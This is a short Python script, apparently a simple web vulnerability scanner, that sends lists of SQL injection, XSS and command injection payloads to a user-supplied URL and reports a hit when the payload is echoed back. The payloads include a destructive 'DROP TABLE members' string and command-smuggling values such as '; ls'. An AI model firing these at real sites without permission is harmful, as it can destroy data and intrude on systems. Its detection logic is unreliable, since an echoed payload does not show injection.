import requests
import urllib.parse

# List of payloads for SQL Injection
sql_payloads = ["' OR '1'='1'", "' OR '1'='2'", "' OR 'a'='a'", '" OR "a"="a"', "' OR 'x'='x'; --", "' OR 1=1; --", "' OR 'x'='x'; DROP TABLE members; --", "' OR 'x'='x'; SELECT * FROM members; --"]

# List of payloads for XSS
xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<svg/onload=alert(1)>", "<body onload=alert('XSS')>"]

# List of payloads for Command Injection
cmd_payloads = ["; ls", "| ls", "`ls`", "|| ls", "&& ls"]

def send_request(url, payload):
    try:
        # Send a GET request to the URL with the payload
        response = requests.get(url + urllib.parse.quote(payload))
        return payload in response.text
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def scan_vulnerability(url, payloads, vulnerability):
    for payload in payloads:
        if send_request(url, payload):
            print(f"Potential {vulnerability} detected at {url}")

def scan_website(url):
    scan_vulnerability(url, sql_payloads, "SQL Injection")
    scan_vulnerability(url, xss_payloads, "XSS")
    scan_vulnerability(url, cmd_payloads, "Command Injection")

if __name__ == "__main__":
    url = input("Enter the URL to scan: ")
    scan_website(url)
